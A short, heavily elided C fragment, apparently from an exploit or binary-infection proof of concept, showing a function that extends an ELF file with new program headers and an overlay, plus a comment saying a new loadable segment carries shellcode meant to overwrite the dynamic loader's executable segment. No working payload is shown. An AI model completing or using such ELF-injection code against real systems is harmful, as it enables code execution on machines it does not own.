...
int extend_elf(int fd, Elf64_Phdr *new_heades, unsigned int new_count,
               char *overlay, unsigned long overlay_len) {
...
int main() {
  ...
  new_headers[0].p_type =
      PT_LOAD; // segment with shellcode, will overwrite ld r-x segment
